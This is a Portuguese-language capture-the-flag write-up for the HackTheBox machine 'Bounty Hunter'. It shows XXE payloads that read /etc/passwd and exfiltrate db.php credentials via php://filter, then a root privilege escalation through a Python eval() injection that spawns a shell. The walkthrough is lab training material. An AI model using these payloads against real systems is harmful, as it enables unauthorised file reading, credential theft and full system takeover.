# Bounty Hunter

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **OS** | Linux |
| **Técnicas** | XXE Injection, LFI, Python eval() Exploitation |
| **Link HTB** | [https://app.hackthebox.com/machines/BountyHunter](https://app.hackthebox.com/machines/BountyHunter) |

## Resumo

Máquina Linux com formulário web vulnerável a XXE (XML External Entity) Injection. Exploração permite LFI para ler arquivos do sistema e obter credenciais. Escalação de privilégios através de script Python com função `eval()` insegura executável como sudo.

## Enumeration/Scanning

### Port Scanning

```bash
nmap -sVC -oN nmap.out -vv [IP]
```

**Portas abertas:**
- 22/tcp - SSH (OpenSSH 8.2p1)
- 80/tcp - HTTP (Apache httpd 2.4.41)

### Web Discovery

Site possui formulário de bug report que aceita submissões.

Fuzzing de diretórios:
```bash
ffuf -c -w ~/wordlists/Discovery/Web-Content/big.txt -u http://10.10.11.100/FUZZ.php
```

**Arquivo encontrado:** `db.php`

## Exploitation

### XXE Injection

Analisando o formulário no BurpSuite, o payload é XML encodado em base64:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
  <title>test</title>
  <cwe>123</cwe>
  <cvss>123</cvss>
  <reward>123</reward>
</bugreport>
```

### LFI via XXE

Payload XXE para ler `/etc/passwd`:

```xml
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///etc/passwd">
]>
<bugreport>
  <title>123</title>
  <cwe>123</cwe>
  <cvss>123</cvss>
  <reward>&sp;</reward>
</bugreport>
```

**Descoberta:** Usuário `development` encontrado.

### Reading PHP Files

Para ler arquivos PHP sem executá-los, usamos encoding base64:

```xml
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
<bugreport>
  <title>123</title>
  <cwe>123</cwe>
  <cvss>123</cvss>
  <reward>&sp;</reward>
</bugreport>
```

**Credenciais obtidas** do banco de dados.

### SSH Access

```bash
ssh development@[IP]
# usando senha encontrada em db.php

cat user.txt
```

**User Flag:** ✓

## Privilege Escalation

### Sudo Permissions

```bash
sudo -l
# (root) /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

### Analyzing ticketValidator.py

O script valida tickets em formato Markdown. Requisitos do arquivo:
- Nome deve terminar em `.md`
- Deve conter estrutura específica com campo `**4+num`

O script usa `eval(int(num))`, que pode ser explorado.

### Python eval() Exploitation

Criando arquivo malicioso:

```markdown
# Skytrain Inc
## Ticket to ?????
__Ticket Code:__
**4+int(__import__('os').system('bash'))
```

Executando:

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
# Fornecendo caminho para o arquivo .md malicioso
```

**Shell obtido:** root

```bash
cat /root/root.txt
```

**Root Flag:** ✓

## Lições Aprendidas

- **XXE Injection** permite ler arquivos locais do sistema quando XML parsing está mal configurado
- PHP files podem ser lidos usando `php://filter` com encoding base64 para evitar execução
- Python `eval()` é extremamente perigoso e nunca deve ser usado com input de usuário
- Markdown files podem conter payloads maliciosos quando processados por scripts inseguros

---

*Writeup by kp*
